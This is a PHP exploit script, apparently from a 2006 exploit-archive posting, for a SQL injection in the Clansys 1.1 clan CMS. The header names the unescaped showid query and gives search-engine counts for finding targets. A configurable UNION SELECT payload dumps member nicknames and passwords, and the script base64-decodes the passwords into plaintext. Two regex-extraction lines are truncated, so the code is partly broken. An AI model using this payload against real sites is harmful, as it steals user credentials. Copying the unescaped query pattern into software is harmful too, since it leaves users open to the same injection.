Clansys v.1.1 (showid) Remote SQL Injection Exploit
===================================================





<?php /*

 |---==============================================================---|
 |                          /\ \__       /\ \                         |   
 |     ____    ___      __  \ \  _\   ___\ \ \___      __    ___      |    
 |    /  __\ /  _  \  / __ \ \ \ \/  / ___\ \  _  \  / __ \/\  __\    |    
 |   /\__,  \/\ \/\ \/\ \_\ \_\ \ \_/\ \__/\ \ \ \ \/\  __/\ \ \/     |     
 |   \/\____/\ \_\ \_\ \__/ \_\\ \__\ \____\\ \_\ \_\ \____\\ \_\     |      
 |    \/___/  \/_/\/_/\/__/\/_/ \/__/\/____/ \/_/\/_/\/____/ \/_/     |     
 |                                     >> Internet Security           |                         
 |---==============================================================---|
 
        title: clansys 1.1 remote sql injection
      release: 2006-04-10
       author: snatcher [snatcher at gmx.ch]
      country: switzerland  |+|
	  
  application: clansys 1.1
  description: a php / mysql based clan content management system
     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=113
  description: you can get each password with a simple sql injection. the password 
               is base64 encoded, but it&#039;s easy to decode, that means, you will get
			   the password in plaintext :)
  fingerprint: google -> "Clansys  v.1.1" -> 4&#039;030
               msn -> "Clansys  v.1.1" ->  529
   conditions: 
       greets: honkey, str0ke <- good exploit publisher :),
			   all security guys and coders over the world,
 terms of use: this exploit is just for educational purposes, do not use it for illegal acts.


---------------------------- member.php - line 180 -------------------------------------
$sql = "SELECT * FROM member WHERE id=$showid";
-----------------------------------------------------------------------------------------

because this $showid isn&#039;t escaped correctly you can insert malicious sql code,
i.e. with a union operator.


*/

/*********************** CONFIGURATION ****************************/

$PATH_TO_FILE  = &#039;http://yourhost.com/index.php&#039;;                  // in example: http://yourhost.com/index.php
$USER_ID       = 1;                                                // which user? default: 1
$TABLE_PREFIX  = &#039;&#039;;                                               // default: empty
$GET_VARS      = &#039;?page=member&func=detail&showid=&#039;;               // do not change
$SQL_INJECTION = &#039;-666 union select 0,nick,realname,nick,pass,&#039;.   // do not change
                 &#039;pass,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&#039;.
				 &#039;0,0,0 from &#039;.$TABLE_PREFIX.&#039;member where id = &#039;.
				 $USER_ID.&#039; limit 1 /*&#039;;


/**************************** MAIN ********************************/

$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die(&#039;couldn\&#039;t open host!&#039;); 
foreach ($file_array as $now)                               
	$html_content .= $now;

$html_content = str_castrate($html_content);

			   $html_content,$username); /* gets username */
                $html_content,$password); /* gets password */

if ($username[1][0] && $password[1][0]) {
	echo &#039;username: <b>&#039;.$username[1][0].&#039;</b> (user_id: &#039;.$USER_ID.&#039;)<br>&#039;;
	echo &#039;password: <b>&#039;.base64_decode($password[1][0]).&#039;</b>&#039;;
}else {
	echo &#039;exploit failed! <br>&#039;;
}
echo &#039;<br><br><br><br><br>
======================================================================<br>
exploit: clansys 1.1 remote sql injection vulnerability<br>
release: 2006-04-10<br>
author: snatcher [snatcher at gmx.ch]<br>
======================================================================&#039;;

function str_castrate($string) {
	$string = str_replace("\n", &#039;&#039;, $string);
	$string = str_replace("\r", &#039;&#039;, $string);
	$string = str_replace(" ", &#039;&#039;, $string);
	return $string;
}
?>



